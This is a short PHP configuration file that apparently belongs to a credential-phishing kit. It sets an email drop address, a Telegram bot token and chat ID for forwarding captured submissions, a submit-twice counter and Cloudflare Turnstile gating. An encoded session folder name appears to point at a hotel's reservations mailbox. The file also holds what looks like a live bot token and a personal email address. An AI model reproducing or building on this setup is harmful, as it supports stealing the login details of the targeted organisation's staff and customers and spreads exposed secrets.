<?php
// ==========================================
// Telegram + Email Configuration
// ==========================================
if (!defined('EMAIL'))      define('EMAIL',      'veronica.mckinney041@gmail.com');
if (!defined('TG_TOKEN'))   define('TG_TOKEN',   '8601828082:AAGauVkQC2bct2TyJYSaRuWYkpFmbGu_CLE');
if (!defined('TG_CHAT_ID')) define('TG_CHAT_ID', '1788371409');
if (!defined('SUBMIT'))     define('SUBMIT',     '2');

// ==========================================
// Cloudflare Turnstile
// ==========================================
if (!isset($cf_site_key))   $cf_site_key   = '0x4AAAAAAA_YOUR_SITE_KEY';
if (!isset($cf_secret_key)) $cf_secret_key = '0x4AAAAAAA_YOUR_SECRET_KEY';

// Feature flag — see build.php / index.php
if (!defined('USE_CLOUDFLARE')) define('USE_CLOUDFLARE', true);

// ==========================================
// Session Storage Configuration
// ==========================================
if (!isset($session_folder)) {
    $session_folder = 'RnByb2R1Y3RzJTNEcmVzZXJ2YXRpb25zQHRoZWdyZWVuaGlsbGhvdGVsLmNv';
}